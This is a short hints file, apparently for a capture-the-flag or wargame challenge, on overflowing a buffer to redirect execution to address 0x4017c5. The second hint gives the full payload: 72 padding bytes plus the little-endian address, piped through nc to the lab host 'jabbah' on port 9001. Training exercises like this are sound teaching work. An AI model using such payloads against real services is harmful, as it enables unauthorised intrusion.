hints:
  - content: |-
      In `printf`, `\x` and two hex digits make one raw byte. To write an address backwards, split it into pairs of digits from the right, then add `00`s until there are 8. For `0x4017c5` that's `\xc5\x17\x40\x00\x00\x00\x00\x00`.
    cost: 0
  - content: |-
      From the Calvera account, send 72 `A`s and then the address: `printf 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc5\x17\x40\x00\x00\x00\x00\x00' | nc jabbah 9001`. If the program printed a different address, put that one in instead.
    cost: 0
